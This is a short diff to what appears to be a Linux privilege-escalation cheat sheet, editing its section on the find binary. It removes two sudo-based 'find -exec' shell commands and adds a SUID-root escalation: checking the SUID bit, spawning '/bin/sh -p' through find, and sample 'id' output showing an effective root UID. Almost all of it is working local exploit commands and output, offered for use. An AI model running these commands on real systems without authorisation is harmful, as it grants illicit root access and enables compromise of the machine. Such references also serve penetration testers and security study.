@@ -917,10 +917,15 @@ sudo /usr/bin/iftop
 ```
 
 ### find
+If `/usr/bin/find` has SUID root set, preserve the effective UID with `-p`:
 
-```
-sudo /usr/bin/find . -exec /bin/bash \; -quit
-sudo /find /bin -name nano -exec /bin/sh \;
+```bash
+ls -la /usr/bin/find
+# -rwsr-xr-x 1 root root ... /usr/bin/find
+
+find . -exec /bin/sh -p \; -quit
+id
+# uid=USER gid=USER euid=0(root)
 ```
 
 ### gcore
